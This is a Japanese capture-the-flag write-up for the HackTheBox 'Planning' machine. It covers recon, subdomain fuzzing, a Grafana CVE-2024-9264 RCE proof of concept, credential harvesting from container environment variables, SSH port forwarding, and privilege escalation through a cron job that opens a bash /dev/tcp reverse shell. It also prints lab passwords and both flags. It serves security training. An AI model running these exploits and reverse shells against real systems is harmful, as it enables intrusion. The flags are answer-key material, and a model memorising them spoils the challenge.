# Planning WriteUps 

- **[HackTheBox_Planning](https://app.hackthebox.com/machines/Planning)**

- admin / passwords
```
admin / 0D5oT70Fq13EvB5r
```

- WorkSpeace
```
mkdir Planning && cd Planning
```

## 調査
まず、targetであるip address(```10.10.11.68```)に```nmap```もしくは```rustscan```でもいいので
開いているサービスを調べる
### 付け加え
こうするといちいちipを入力しなくてもいい
```
export ip="10.10.11.68"
# 使用するときは $ipと使う
```

### Nmap Options
- nmap cmd 
```
nmap $ip -sC -sV -sC -oN target_port.log -T4  
```

- scan結果
```
# Nmap 7.95 scan initiated Tue Jul  1 14:53:40 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -oN target_port.log -T4 10.10.11.68
Nmap scan report for 10.10.11.68
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  1 14:54:05 2025 -- 1 IP address (1 host up) scanned in 24.95 seconds
```

これらから、22,80が開いていることがわかる。
また、```_http-title: Did not follow redirect to http://planning.htb/```から```/etc/hosts```に
```10.10.11.68   planning.htb```と指定する必要がある。

### http://planning.htbにて
contactなどの送信フォームなどでスクリプトを発火させることができるかと検証をしたが
特に見当たらなかったので```ffuf```でsubdomainを探すことにした

今回使用したwordlilst
- **[Seclists](https://github.com/danielmiessler/SecLists)**

gitでclone
```
git clone https://github.com/danielmiessler/SecLists.git
```
ちなみに今後様々な問題を解くうえでこういったwordlistsは```/usr/share```の下に設けるといいだろう

僕の場合、```Planning``` wordspaceに
```
cat /usr/share/Seclists/Discoverty/DNS/subdomains-* >> subdomain.txt
```
とすべてのsubdomainを```subdomain.txt```でまとめて使用した。

### ffuf Options
```
ffuf -w subdomain.txt -u http://planning.htb -c -H "Host :FUZZ.planning.htb" -o ffuf.log
```
これにより、```grafana```というsubomainが見つかる。
もちろん、```grafana.planning.htb```を```/etc/hosts```に追加しなければならないので
```10.10.11.68   planning.htb grafana.planning.htb```となる。

そこから、```http://grafana.planning.htb```にアクセスすると
```/login```ページに飛ばされる。
そこから有力な情報がないか調べた際に
Version情報があり、```Grafana v11.0.0 (83b9528bce)```と記載されてたため
そこからExploitを探索し```CVE-2024-9264```が見つかり、
Githubから**[Poc](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)**を使用し

先に```netcat```で待ち受けし、
```
nc -lvnp 1234
```

その後、以下のoptionで```poc.py```スクリプトを実行
```
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.11.68 --reverse-port 1234 
```

###　Environment
無事に入れたので
まず、このマシンがコンテナどうか```env```で調べます。
```
GF_PATHS_LOGS=/var/log/grafana
_=dockerenv
```
この情報から```Docker````のコンテナ内というのがわかりました。
また、
```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```
これらの情報から```enzo``` Userと```RioTecRANDEntANT!``` Passwordを取得できた。

## User Flag

```
ssh -p 22 enzo@10.10.11.68
```
から```RioTecRANDEntANT!```とpasswordを入力し、
user.txtからFlagを取得
```
86c057f17190dee41a5c5295959d573d
```
### サービスチェック
他にもこのマシン上でどのサービスが開いているか調べるために
```
ss -tul
```
で調べた結果
```
127.0.0.1:8000
```
が開いており、それを自分のマシンへと転送するために
```
ssh -p22 enzo@10.10.11.68 -L 8000:127.0.0.1:8000
```
とし、
自分のマシンから```http://127.0.0.1:8000```にアクセス
すると、loginホップアップが出たので
一旦、```10.10.11.68```のsshに戻って
そこでlogin情報で必要な情報を```linpeas.sh```を使ってみる。
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
で自分のマシンにダウンロードします。
targetマシンである```10.10.11.68```に持っていきたいので
自分のマシンで以下のcmdを実行
```
python3 -m http.server 8080
```

これでHTTP Serverが開くので
targetマシン上で
```
wget http://10.10.XX.XX:8080/linpeas.sh
```
で持ってきて
```
chmod +x linpeas.sh
```
実行権限を与えて```./linpeas.sh```でscanします。

SQL File Pathから```Found /var/lib/command-not-found/commands.db```が出力され
```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
から、
```
root /  P4ssw0rdS0pRi0T3c
```
を発見！

試しにlogin ホップアップに入力
無事、loginできました！！

その後、新規で
```
bash -c 'exec bash -i >& /dev/tcp/10.10.16.3/1234 0>&1'
```
を保存し
先に```netcat```で待ち受けし
```
nc -lvnp 1234 
```

そして、```run now```で実装します。

そうするとshellがとれて```id```から
```
uid=0(root) gid=0(root) groups=0(root)
```
わかり、```/root/root.txt```

## Root Flag
```
0ebacefa1bfc4ad4eca56fa64ba4de02
```

## completed!!
